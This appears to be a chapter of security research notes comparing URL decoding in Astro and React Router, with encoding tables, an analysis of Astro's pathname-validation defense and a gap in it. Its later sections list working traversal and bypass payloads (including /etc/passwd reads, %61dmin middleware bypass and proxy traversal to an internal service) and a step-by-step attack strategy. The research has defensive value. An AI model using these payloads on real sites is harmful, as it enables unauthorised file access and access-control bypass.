# 04 - Encoding Matrix

## Full Encoding Matrix: Astro vs React Router

Astro uses `decodeURI()`. React Router uses `decodeURIComponent()`. This creates fundamentally different attack surfaces.

### Path Separator Encodings

| Input | Astro `decodeURI()` | React `decodeURIComponent()` | Traversal? (Astro) | Traversal? (React) |
|---|---|---|---|---|
| `../` | `../` (literal) | `../` (literal) | YES (if in catch-all) | YES |
| `..%2F` | `..%2F` | `../` | NO (slash preserved) | YES |
| `..%2f` | `..%2f` | `../` | NO (slash preserved) | YES |
| `%2E%2E%2F` | `..%2F` | `../` | NO (dots decoded, slash preserved) | YES |
| `%2e%2e%2f` | `..%2f` | `../` | NO (dots decoded, slash preserved) | YES |
| `..%252F` | REJECTED (multi-level) | `..%2F` | BLOCKED | Partial |
| `..%252f` | REJECTED (multi-level) | `..%2f` | BLOCKED | Partial |

### Dot Encodings

| Input | Astro `decodeURI()` | React `decodeURIComponent()` | Notes |
|---|---|---|---|
| `%2E` | `.` | `.` | Both decode |
| `%2e` | `.` | `.` | Both decode |
| `%2E%2E` | `..` | `..` | Both produce `..` |
| `%252E` | REJECTED (multi-level) | `%2E` | Astro blocks double-encode |
| `%c0%ae` | Error (invalid UTF-8) | Error | Both reject |

### Letter Encodings (CVE-2025-64765 Attack Surface)

| Input | Astro `decodeURI()` | React `decodeURIComponent()` | Notes |
|---|---|---|---|
| `%61` (a) | `a` | `a` | Both decode -- Astro middleware bypass vector |
| `%41` (A) | `A` | `A` | Both decode |
| `%64%6d%69%6e` | `dmin` | `dmin` | Astro: `/%61%64%6d%69%6e` -> `/admin` |
| `%2561` | REJECTED | `%61` | Astro blocks multi-level |

### Query/Fragment Encodings

| Input | Astro `decodeURI()` | React `decodeURIComponent()` | Notes |
|---|---|---|---|
| `%3F` (?) | `%3F` (preserved) | `?` (decoded) | Astro preserves query marker |
| `%23` (#) | `%23` (preserved) | `#` (decoded) | Astro preserves fragment marker |
| `%26` (&) | `%26` (preserved) | `&` (decoded) | Astro preserves ampersand |
| `%3D` (=) | `%3D` (preserved) | `=` (decoded) | Astro preserves equals |

### Special Characters

| Input | Astro `decodeURI()` | React `decodeURIComponent()` | Notes |
|---|---|---|---|
| `%20` (space) | ` ` (space) | ` ` (space) | Both decode |
| `%00` (null) | `\0` | `\0` | Both decode -- null byte injection |
| `%0A` (newline) | `\n` | `\n` | Both decode -- CRLF potential |
| `%0D` (CR) | `\r` | `\r` | Both decode |
| `%5C` (\) | `\` | `\` | Both decode backslash |
| `%2B` (+) | `%2B` (preserved) | `+` (decoded) | Astro preserves plus |
| `%3A` (:) | `%3A` (preserved) | `:` (decoded) | Astro preserves colon |
| `%40` (@) | `%40` (preserved) | `@` (decoded) | Astro preserves at sign |

### Backslash Traversal

| Input | Astro `decodeURI()` | React `decodeURIComponent()` | Notes |
|---|---|---|---|
| `%5C` | `\` | `\` | Both decode -- OS-dependent traversal |
| `..%5C..%5C` | `..\..\ ` | `..\..\ ` | Both decode -- Windows traversal |
| `%5c..%5c` | `\..\` | `\..\` | Both decode |

### Unicode Normalization

| Input | Astro `decodeURI()` | React `decodeURIComponent()` | Notes |
|---|---|---|---|
| `%C0%AF` | Error (overlong `/`) | Error | Both reject overlong UTF-8 |
| `%E2%80%8B` | ZWSP | ZWSP | Zero-width space -- filter bypass |
| `%EF%BC%8F` | Fullwidth `/` | Fullwidth `/` | Unicode normalization concern |

## `validateAndDecodePathname()` Defense Matrix

This is the key defense added in Astro v5.18:

| Input | After `decodeURI()` | Changed? | Still Has `%XX`? | Result |
|---|---|---|---|---|
| `/admin` | `/admin` | No | No | PASS |
| `/%61dmin` | `/admin` | Yes | No | PASS (CVE-2025-64765 vector) |
| `/files%2Fpath` | `/files%2Fpath` | No | Yes | PASS (no change, encoding preserved) |
| `/%2561dmin` | `/%61dmin` | Yes | Yes (`%61`) | REJECTED (multi-level) |
| `/hello%20world` | `/hello world` | Yes | No | PASS |
| `/test%2F%61bc` | `/test%2Fabc` | Yes | Yes (`%2F`) | REJECTED (multi-level) |
| `/%252E%252E` | `/%2E%2E` | Yes | Yes | REJECTED |

### Gap in Defense

The defense has a gap: if the input contains `%2F` and NO other encoded characters change, it passes through because `hasDecoding` is false. The `%2F` stays in the result:

```
Input:  /files%2Fadmin
After:  /files%2Fadmin  (unchanged -- decodeURI doesn't touch %2F)
hasDecoding = false
decodedStillHasEncoding = true (but hasDecoding is false!)
Result: PASS -- /files%2Fadmin reaches the application
```

## Practical Attack Vectors by Route Type

### `[param]` Routes (regex: `([^/]+?)`)

- `%2F` traversal: **BLOCKED** (regex rejects `/`, and `%2F` stays encoded)
- Encoded letters: **Works** (e.g., `%61dmin` -> `admin`)
- Double encoding: **BLOCKED** by `validateAndDecodePathname()`

Effective payloads:
```
/users/%61dmin          -> params.userId = 'admin'
/users/hello%20world    -> params.userId = 'hello world'
/users/%00admin         -> params.userId = '\0admin' (null byte)
```

### `[...param]` Catch-All Routes (regex: `(.*?)`)

- Literal `/` traversal: **Works** (regex matches `/`)
- `%2F` traversal: **BLOCKED** (`decodeURI` preserves `%2F`, but `%2F` is passed literally)
- Encoded letters: **Works**
- Encoded dots: **Works** (`%2E%2E` -> `..`)

Effective payloads:
```
/files/../../etc/passwd            -> params.path = '../../etc/passwd'
/files/%2E%2E/%2E%2E/etc/passwd   -> params.path = '../../etc/passwd'
/files/a/b/../../admin/secrets     -> params.path = 'a/b/../../admin/secrets'
```

### API Catch-All Routes

Same as page catch-all routes, but response is returned directly to the client:
```
/api/proxy/../../internal-service/admin
-> fetch(`https://backend.internal/../../internal-service/admin`)
-> Response returned to attacker
```

## Summary: Astro-Specific Traversal Strategy

1. **Do NOT use `%2F`-based traversal** -- it stays encoded in Astro
2. **Use literal slashes in catch-all routes** -- they pass through directly
3. **Use encoded dots (`%2E%2E`)** for dot-dot sequences that might be filtered
4. **Use encoded letters (`%61dmin`)** for middleware bypass
5. **Do NOT double-encode** -- `validateAndDecodePathname()` blocks it
6. **Target catch-all `[...param]` routes** -- they are the primary attack surface
